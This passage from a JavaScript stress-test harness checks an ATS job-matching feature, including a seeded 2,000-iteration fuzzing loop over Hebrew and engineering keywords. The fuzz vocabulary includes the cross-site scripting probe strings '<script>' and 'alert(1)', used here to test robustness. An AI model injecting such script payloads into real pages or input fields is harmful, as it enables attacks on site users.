    }, 'loadSampleAtsJob("solar") must not throw');
    assert(mockDomElements.atsScoreValue.textContent.indexOf('%') !== -1, 'Solar sample score formatted');

    assertDoesNotThrow(() => {
      window.loadSampleAtsJob('bsc_gap');
    }, 'loadSampleAtsJob("bsc_gap") must not throw');
    const bscScoreVal = parseInt(mockDomElements.atsScoreValue.textContent, 10);
    assertLessOrEqual(bscScoreVal, 55, 'bsc_gap sample job UI score must be <= 55%');

    // Clear input
    assertDoesNotThrow(() => {
      window.clearAtsInput();
    }, 'clearAtsInput must not throw');
    assertEqual(mockDomElements.atsScoreValue.textContent, '0%', 'Cleared ATS score is 0%');

    // Invalid selector indices
    const badIndices = [-1, 999999, 'invalid', null, undefined, NaN, {}];
    badIndices.forEach((badIdx, i) => {
      assertDoesNotThrow(() => {
        window.onAtsJobSelected(badIdx);
      }, 'onAtsJobSelected bad index #' + i + ' must not throw');
    });

    // onAtsInputChanged debounce timer flush
    assertDoesNotThrow(() => {
      mockDomElements.atsJobInput.value = 'דרוש בקר גז טבעי SCADA PRMS הנדסאי מכונות';
      window.onAtsInputChanged();
      flushTimers();
    }, 'onAtsInputChanged with timer flush must not throw');
  })();

  // =========================================================================
  // SUITE 7: High-Volume Fuzzing Loop (2,000 iterations)
  // =========================================================================
  print('--- Suite 7: High-Volume Fuzzing Loop (2,000 iterations) ---');

  (function testFuzzingLoop() {
    const vocab = [
      'דרוש', 'מהנדס', 'הנדסאי', 'מכונות', 'חשמל', 'בקר', 'גז', 'טבעי',
      'SCADA', 'PRMS', 'PLC', 'Lean', 'Six Sigma', 'CAPEX', 'OPEX', 'BESS',
      'High Voltage', 'FPSO', 'Energean', 'רופין', 'ממונה', 'בטיחות',
      'B.Sc', 'תואר', 'ראשון', 'עבודה', 'בגובה', '<script>', 'alert(1)',
      '12345', '!@#$%^&*()', ' ', '\n', '\t'
    ];

    let seed = 42;
    function pseudoRandom() {
      seed = (seed * 9301 + 49297) % 233280;
      return seed / 233280;
    }

    const tStart = Date.now();
    const FUZZ_COUNT = 2000;

    for (let iter = 0; iter < FUZZ_COUNT; iter++) {
      const wordCount = Math.floor(pseudoRandom() * 20);
      const chosenWords = [];
      for (let w = 0; w < wordCount; w++) {
        const idx = Math.floor(pseudoRandom() * vocab.length);
        chosenWords.push(vocab[idx]);
      }
      const fuzzString = chosenWords.join(pseudoRandom() > 0.5 ? ' ' : '');

      let resFuzz = null;
      try {
        resFuzz = window.runAtsJobMatching(fuzzString);
      } catch (err) {
        failedTests++;
        failureLog.push('Fuzz iteration #' + iter + ' crashed: ' + err);
        break;
      }

      totalTests++;
      if (typeof resFuzz.matchScore === 'number' &&
          resFuzz.matchScore >= 0 &&
          resFuzz.matchScore <= 100 &&
          !isNaN(resFuzz.matchScore)) {
        passedTests++;
      } else {
        failedTests++;
        failureLog.push('Fuzz iteration #' + iter + ' returned invalid matchScore: ' + resFuzz.matchScore);
        break;
      }

      // Check invariant: if B.Sc. engineer gap is present, score MUST be <= 55%
      const hasBscGap = resFuzz.hardGates.some(g => g.id === 'gate_degree_bsc_engineer' && g.status === 'GAP');
      const hasSafetyGap = resFuzz.hardGates.some(g => g.id === 'gate_safety_officer' && g.status === 'GAP');
      if (hasBscGap || hasSafetyGap) {
        totalTests++;
        if (resFuzz.matchScore <= 55) {
          passedTests++;
        } else {
          failedTests++;
          failureLog.push('Fuzz invariant violation: GAP present but score=' + resFuzz.matchScore);
        }
      }
    }

    const fuzzElapsed = Date.now() - tStart;
    print('  Completed ' + FUZZ_COUNT + ' fuzzing iterations in ' + fuzzElapsed + ' ms.');
    assertLessOrEqual(fuzzElapsed, 2000, '2000 fuzzing iterations must complete in < 2000ms');
  })();

  // =========================================================================
  // Final Stress Summary & Exit
  // =========================================================================
  print('\n======================================================');
  print('MILESTONE 2 ATS CHALLENGER STRESS HARNESS SUMMARY:');
  print('Total Assertions: ' + totalTests);
  print('Passed:           ' + passedTests);
  print('Failed:           ' + failedTests);
  print('======================================================\n');

  if (failedTests > 0) {
    print('[FAIL] ' + failedTests + ' test(s) failed in stress harness:');
    failureLog.forEach(msg => print('  - ' + msg));
    quit(1);
  } else {
    print('ALL STRESS TESTS PASSED SUCCESSFULLY.');
    quit(0);
  }
})();
